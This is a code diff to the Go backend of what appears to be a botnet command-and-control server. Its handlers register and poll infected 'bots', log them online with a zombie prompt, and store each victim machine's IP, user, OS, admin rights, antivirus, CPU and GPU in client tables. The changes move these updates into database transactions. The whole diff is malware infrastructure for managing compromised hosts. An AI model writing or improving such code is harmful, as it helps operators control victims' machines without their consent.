@@ -56,16 +56,28 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 		log.Println(err.Error())
 	} else {
 		// Find the bot
+		fmt.Print("[🧟] Bot[" + guid + "] online\n$ ")
 		reply.Args["Token"] = out_token
+		tx, _ := common.Db.Begin()
 		// Update timestamp lastseen
-
 		strSql = "update clients set token=?,ip=?,whoami=?,os=?,installdate=?,isadmin=?,antivirus=?,cpuinfo=?,gpuinfo=?,clientversion=?,lastseen=?,status=? where guid=?"
-		_, err = db1.Exec(common.Db, strSql, out_token, bot.Ip, bot.Whoami, bot.Os, utils.TimestampStringToMySqlDateTime(bot.Installdate), bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, utils.TimestampStringToMySqlDateTime(time1), "active", out_guid)
+		_, err = tx.Exec(strSql, out_token, bot.Ip, bot.Whoami, bot.Os, utils.TimestampStringToMySqlDateTime(bot.Installdate), bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, utils.TimestampStringToMySqlDateTime(time1), "active", out_guid)
 		if err != nil {
+			tx.Rollback()
 			reply.Status = 0
 			reply.Error = "Find the bot but failed to update"
 			log.Println(err.Error())
 		}
+		// Delete record in clients_archived
+		strSql = "delete from clients_archived where guid=?"
+		_, err = tx.Exec(strSql, guid)
+		if err != nil {
+			tx.Rollback()
+			reply.Status = 0
+			reply.Error = "Find the bot but failed to update"
+			log.Println(err.Error())
+		}
+		tx.Commit()
 	}
 
 	err = http_sender(w, guid, out_token, &reply)
@@ -94,28 +106,27 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 	reply.Status = 1
 	reply.TaskId = 0
 
-	// Update the status of clients and clients_archived
-	sqlStr := "update clients set status='active', lastseen=? where guid=?"
-	_, err := db1.Exec(common.Db, sqlStr, utils.TimestampStringToMySqlDateTime(time1), guid)
-	if err != nil {
-		log.Println("db1.Exec err: ", err.Error())
-	}
+	var sqlStr string
 	// Clients_archived
 	tx, err := common.Db.Begin()
 	if err != nil {
 		log.Println("tx begin err:", err.Error())
 		goto ReadyPoll
 	}
-
-	sqlStr = "insert into clients(guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, status) " +
-		"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, 'active' from clients_archived where guid=?"
-	_, err = tx.Exec(sqlStr, guid)
+	// Update the status of clients and clients_archived
+	sqlStr = "update clients set status='active', lastseen=? where guid=?"
+	_, err = db1.Exec(common.Db, sqlStr, utils.TimestampStringToMySqlDateTime(time1), guid)
 	if err != nil {
-		tx.Rollback()
-		log.Println("tx insert err:", err.Error())
-		goto ReadyPoll
+		log.Println("db1.Exec err: ", err.Error())
 	}
-
+	//sqlStr = "insert into clients(guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, status) " +
+	//	"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, 'active' from clients_archived where guid=?"
+	//_, err = tx.Exec(sqlStr, guid)
+	//if err != nil {`
+	//	tx.Rollback()
+	//	log.Println("tx insert err:", err.Error())
+	//	goto ReadyPoll
+	//}
 	sqlStr = "delete from clients_archived where guid=?"
 	_, err = tx.Exec(sqlStr, guid)
 	if err != nil {
